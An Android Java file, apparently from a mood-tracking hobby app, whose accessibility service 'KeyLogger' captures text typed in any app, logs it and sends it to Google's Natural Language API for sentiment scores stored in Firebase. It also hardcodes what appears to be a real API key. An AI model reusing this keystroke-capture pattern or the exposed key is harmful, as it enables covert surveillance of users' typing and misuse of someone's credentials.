package com.example.keyboard;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.support.annotation.NonNull;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.IOException;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.HashMap;
import java.util.Locale;

import com.google.api.client.extensions.android.http.AndroidHttp;
import com.google.api.client.extensions.android.json.AndroidJsonFactory;
import com.google.api.services.language.v1.CloudNaturalLanguage;
import com.google.api.services.language.v1.CloudNaturalLanguageRequestInitializer;
import com.google.api.services.language.v1.model.AnnotateTextRequest;
import com.google.api.services.language.v1.model.AnnotateTextResponse;
import com.google.api.services.language.v1.model.Document;
import com.google.api.services.language.v1.model.Features;
import com.google.api.services.language.v1.model.Sentiment;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;


public class KeyLogger extends AccessibilityService {
    String currentText = "";
    public static final String API_KEY = "AIzaSyAa3SUQLgSHrE8bxFTF39W0a0Vt2zXKpL8";
    static private CloudNaturalLanguage naturalLanguageService;
    static private Document document;
    static private Features features;



    void getSentiment(String text, final String time){
        naturalLanguageService = new CloudNaturalLanguage.Builder(
                AndroidHttp.newCompatibleTransport(),
                new AndroidJsonFactory(),
                null
        ).setCloudNaturalLanguageRequestInitializer(
                new CloudNaturalLanguageRequestInitializer(API_KEY)
        ).build();

        document = new Document();
        document.setType("PLAIN_TEXT");
        document.setLanguage("en-US");

        features = new Features();
        features.setExtractEntities(true);
        features.setExtractSyntax(true);
        features.setExtractDocumentSentiment(true);

        final AnnotateTextRequest request = new AnnotateTextRequest();
        request.setDocument(document);
        request.setFeatures(features);


        document.setContent(text);
        new AsyncTask<Object, Void, AnnotateTextResponse>() {
            @Override
            protected AnnotateTextResponse doInBackground(Object... params) {
                AnnotateTextResponse response = null;
                try {
                    response = naturalLanguageService.documents().annotateText(request).execute();

                } catch (IOException e) {
                    e.printStackTrace();
                }
                return response;
            }

            @Override
            protected void onPostExecute(AnnotateTextResponse response) {
                super.onPostExecute(response);
                if (response != null) {
                    Sentiment sent = response.getDocumentSentiment();
                    Log.d("Sentiment analysis","Score : " + sent.getScore() + " Magnitude : " + sent.getMagnitude());
                    writeToFB(sent.getScore(),sent.getMagnitude(),time);
                }
            }
        }.execute();
    }

    //dummy comment
    void writeToFB(float score,float magnitude,String time){
        System.out.println("In writeToFB");
        FirebaseUser currentUser = FirebaseAuth.getInstance().getCurrentUser();
        if (currentUser != null) {
            Log.d("CurrentDatabase",currentUser.getEmail());
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference userRef = database.getReference(currentUser.getUid());
            DatabaseReference timeRef = userRef.child(time);
            //DatabaseReference scoreRef = timeRef.child("score");
            //DatabaseReference timevalRef = timeRef.child("time");
            timeRef.setValue(score*magnitude*100);
//            scoreRef.setValue(score);
//            magnitudeRef.setValue(magnitude);



//            String msg = "your message";
//            Intent intent = new Intent(this , NewMessageNotification.class);
//            intent.putExtra("message",msg);
//            startActivity(intent);


            //Intent intent = new Intent(this, NewMessageNotification.class);

            Boolean isImageNotification = false;

            System.out.println("PogU");
            String songname;

            getData();
//            userRef.getParent().child("Notification").addValueEventListener(new ValueEventListener() {
//            @Override
//            public void onDataChange(DataSnapshot dataSnapshot) {
//                System.out.println("start");
//                HashMap<String, Object> td = (HashMap<String,Object>) dataSnapshot.getValue();
//                HashMap<String, Object> songs = (HashMap<String,Object>) td.get("song");
//                callMessageNotification(songs.get("song1").toString());
//                //songname = songs.get("song1");
//                System.out.println("end");
//                //   List<Object> values = td.values();
//
//                //notifyDataSetChanged();
//            }
//
//            @Override
//            public void onCancelled(@NonNull DatabaseError databaseError) {
//
//            }
//
//
//        });

//            Bitmap loadingpic=null;
//            NewMessageNotification naman = new NewMessageNotification();
//            naman.notify(this, "FUCK B", 5, "1");


//            if(isImageNotification)
//            {
//                new AsyncTask<Void, Void, Bitmap>() {
//                    @Override
//                    protected Bitmap doInBackground(Void... urls) {
//
//                        try {
//
//                            System.out.println("SHERLOCK HERE HERE");
//                            Bitmap picture = BitmapFactory.decodeStream(new java.net.URL("https://res.cloudinary.com/demo/image/upload/w_250,h_250,c_mfit/w_700/sample.jpg").openStream());
//                            return picture;
//
//                        } catch (IOException e) {
//                            e.printStackTrace();
//                        }
//                        return null;
//                    }
//
//                    protected void onPostExecute(Bitmap picture) {
//
////                    loadingpic = picture;
//                        System.out.println("SHERLOCKED");
//                        callImageNotification(picture, "https://res.cloudinary.com/demo/image/upload/w_250,h_250,c_mfit/w_700/sample.jpg");
//
//
//                    }
//                }.execute();
//            }
//            else
//            {
//                callMessageNotification("let's talk about about me, let's talk about the 6'8 frame the 37 in verticle leap...the black steel that drapes down my back aka the bullet proof mullet, the google prototype scopes with built in LCD LED 1080p 3D sony technology. The Ethiopian poisonous catapillar aka SLICK DADDY. lets talk about the cabinets right behind me that go 40ft deep that house the other 95% of my trophies, the awards, the certificates, all claiming first place, right? Let me give you a little inside glimpse into the hotshot, video game life style of the two time of the international video game superstar. because thats what the channels about, thats what this domain is about, that is what society is about. you are looking at the new face of twitch and GODDAMN is twitch lucky... thats just off the top of my head");
//            }




            //Intent intent = new Intent();

        }


    }



    private void getData()
    {

        FirebaseUser currentUser = FirebaseAuth.getInstance().getCurrentUser();
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference userRef = database.getReference(currentUser.getUid());

        userRef.getParent().child("Notification").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                System.out.println("start");
                HashMap<String, Object> td = (HashMap<String,Object>) dataSnapshot.getValue();
                HashMap<String, Object> meme = (HashMap<String,Object>) td.get("meme");

                callCorrospondingNotificationMethod(meme.get("meme2").toString(), true);
                //callMessageNotification(songs.get("song1").toString());
                //songname = songs.get("song1");
                System.out.println("end");
                //   List<Object> values = td.values();

                //notifyDataSetChanged();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }


    private void callCorrospondingNotificationMethod(String data, boolean isImageNotification)
    {
        //boolean isImageNotification=true;


        if(isImageNotification)
        {
            new AsyncTask<Void, Void, Bitmap>() {
                @Override
                protected Bitmap doInBackground(Void... urls) {

                    try {

                        System.out.println("SHERLOCK HERE HERE");
                        Bitmap picture = BitmapFactory.decodeStream(new java.net.URL(data).openStream());
                        return picture;

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    return null;
                }

                protected void onPostExecute(Bitmap picture) {

//                    loadingpic = picture;
                    System.out.println("SHERLOCKED");
                    callImageNotification(picture, data);


                }
            }.execute();
        }
        else
        {
            callMessageNotification(data);
        }
    }

    private void callImageNotification(Bitmap picture, String link)
    {
        System.out.println("PogU");
        NewImageNotification naman = new NewImageNotification();
        naman.notify(this, link, 5, "1", picture);
    }


    private void callMessageNotification(String joke)
    {
        System.out.println("PogU");

        NewMessageNotification naman = new NewMessageNotification();
        naman.notify(this, joke, 5, "1");
    }


    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            Log.d("Keylogger", params[0]);

            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {

        Log.d("Keylogger", "Starting service");
    }




    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MMMM dd, yyyy HH:mm:ss Z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                Log.d("data:  ",data);
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);
                currentText = data;
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                if(currentText!="") {
                    sendTask.execute(time + "|(FOCUSED)|" + currentText);
                    getSentiment(currentText,time);
                    currentText = "";
                }

                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }


}
